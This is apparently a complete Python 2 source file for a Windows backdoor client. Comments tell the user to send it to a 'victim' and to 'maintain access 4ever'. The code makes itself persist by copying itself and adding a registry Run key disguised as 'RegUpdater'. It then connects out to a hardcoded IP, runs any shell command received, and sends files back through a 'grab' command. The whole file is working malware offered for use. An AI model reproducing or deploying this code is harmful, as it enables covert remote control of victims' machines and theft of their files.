#Client Backdoor
#Use this backdoor with TCP-Server.py
#Launch the TCP-server.py, send this to the victim and voila
#This backdoor is persistence, modify the registry key on windows and every time the victim turns on the computer You should
#have the tcp-server listening, just go brow #JustGo Infect just once and maintaing acess 4ever
#Tested on Windows 7 x64 Ultimate and Home Premium.

import socket 
import subprocess 
import os
import _winreg as wreg

path = os.getcwd().strip('/n')  
Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
destination = userprof.strip('\n\r') + '\\Documents\\'  +'persistence.exe'

if not os.path.exists(destination):  

    shutil.copyfile(path+'\persistence.exe', destination)
                                                        
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
                         wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
    key.Close()



def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
        
    else: 
        s.send('Unable to find out the file')

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('172.16.52.136', 8080)) 
 
    while True: 
        command =  s.recv(1024)
        
        if 'terminate' in command:
            s.close()
            break 


        elif 'grab' in command: 
            grab,path = command.split('*')
            try:
                transfer(s,path)
            except Exception,e:
                s.send ( str(e) )
                pass
        


        elif 'cd' in command: 
            code,directory = command.split (' ') 
            os.chdir(directory) 
            s.send( "[+] CWD Is " + os.getcwd() ) 

            
        
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  ) 

def main ():
    connect() 
main()
